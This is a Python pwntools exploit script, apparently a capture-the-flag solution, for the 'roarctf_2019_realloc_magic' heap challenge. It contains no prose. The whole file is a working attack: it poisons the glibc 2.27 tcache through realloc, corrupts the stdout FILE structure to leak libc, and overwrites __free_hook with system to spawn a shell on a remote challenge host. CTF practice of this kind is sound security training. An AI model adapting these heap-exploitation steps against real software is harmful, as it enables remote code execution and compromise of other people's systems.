#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: 2020.11.16 17.36.39
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

#context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./roarctf_2019_realloc_magic')
libc = ELF('./libc-2.27.so')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/glibc/x64/2.27/lib/libc-2.27.so')

def add(size,cont):
	sh.sendlineafter('>> ','1')
	sh.sendlineafter('Size?\n',str(size))
	if(size!=0):
		sh.sendafter('Content?\n',str(cont))


def delete():
	sh.sendlineafter('>> ','2')

def ba():
	sh.sendlineafter('>> ','666')

def show_addr(name,addr):
	log.success('The '+str(name)+' Addr:' + str(hex(addr)))

#sh = process('./roarctf_2019_realloc_magic')

def pwn():
	#chunk0
	add(0x70,'A'*8)
	add(0,'A'*8)
	#chunk1
	add(0x100,'B'*8)
	add(0,' ')
	#chunk2
	#gdb.attach(sh)
	add(0xa0,'C'*8)
	add(0,' ')
	delete()
	#chunk1
	add(0x100,'B'*8)
	for i in range(7):
		delete()
	add(0,'')

	add(0x70,'A'*8)			#0	

	#gdb.attach(sh,'b*$rebase(0x0A2A)')
	#hijacking
	add(0x180,'D'*8)
	payload = 'A'*0x78 + p64(0x41) 
	payload += '\x60\x67'
	add(0x180,payload)
	add(0,'')
	add(0x100,'B'*8)  		#1
	add(0,'')
	#gdb.attach(sh)
	payload1 = p64(0xfbad1887) + p64(0)*3 + p8(0x58)
	#gdb.attach(sh,'b*puts')
	add(0x100,payload1)

	#leaking
	libc_addr = u64(sh.recvuntil('\x7f',timeout=0.1).ljust(8,'\x00')) - libc.sym['_IO_file_jumps']
	if(libc_addr == -libc.sym['_IO_file_jumps']):
		sh.close()
		log.info("Fail!")
	system_addr = libc_addr + libc.sym['system']
	free_hook = libc_addr + libc.sym['__free_hook']
	show_addr('libc_addr',libc_addr)
	show_addr('system_addr',system_addr)
	
	#attack
	ba()
	add(0x120,'A')
	add(0,'')
	add(0x130,'B')
	add(0,'')
	add(0x200,'C')
	add(0,'')

	add(0x130,'B')
	for i in range(7):
		delete()
	add(0,'')
	add(0x120,'A')
	payload3 = 'A'*0x128 + p64(0x41)
	payload3 += p64(free_hook-0x8)
	add(0x260,payload3)
	add(0,'')
	add(0x130,'A'*8)
	add(0,'')

	add(0x130,'/bin/sh\x00'+p64(system_addr))
	delete()
	sh.interactive()
	
if __name__ == "__main__":
	while True:
        	sh = remote('node3.buuoj.cn',29854)
	
		try:
            		pwn()
        	except:
            		sh.close()
	


